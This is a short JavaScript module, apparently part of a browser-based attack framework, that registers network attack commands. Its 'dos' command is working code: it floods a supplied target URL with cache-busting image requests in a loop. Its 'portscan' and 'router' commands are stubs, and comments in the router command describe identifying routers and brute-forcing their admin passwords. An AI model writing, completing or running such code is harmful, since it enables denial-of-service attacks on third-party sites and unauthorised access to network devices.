define(['utils','command'], function(utils, command){

	/*==========================================================

	Network based commands

	Following commands implemented here
		Denial of Service
		Portscan
		Router Identification and Exploitation

	============================================================*/

	command.
	factory('dos', { // Denial of Service Attack
		// Need to add another DoS method. Using Web Workers and CORS
		perform: function(){
			var target = this.data[0];
			var duration = parseInt(this.data[1]);
			var active = true;

			console.log(duration);
			var img = document.createElement('image');
			var i = 0;
			while(active){
				console.log("DoSing");
				img.src = target + '?' + i;
				i++;
				if(i > duration && duration !== 0){
					active = false;
				}
			}
			this.complete();
		}
	}).
	factory('portscan', {
		perform: function(){
			this.complete();
		}
	}).
	factory('router', {

		perform: function(){
			this.identify();
		},

		identify: function(){
			// Find the type and model of the router
		},

		crack: function(){
			// try cracking the password for the web interface
			// with a brute force or dictionary attack
		}
	});

});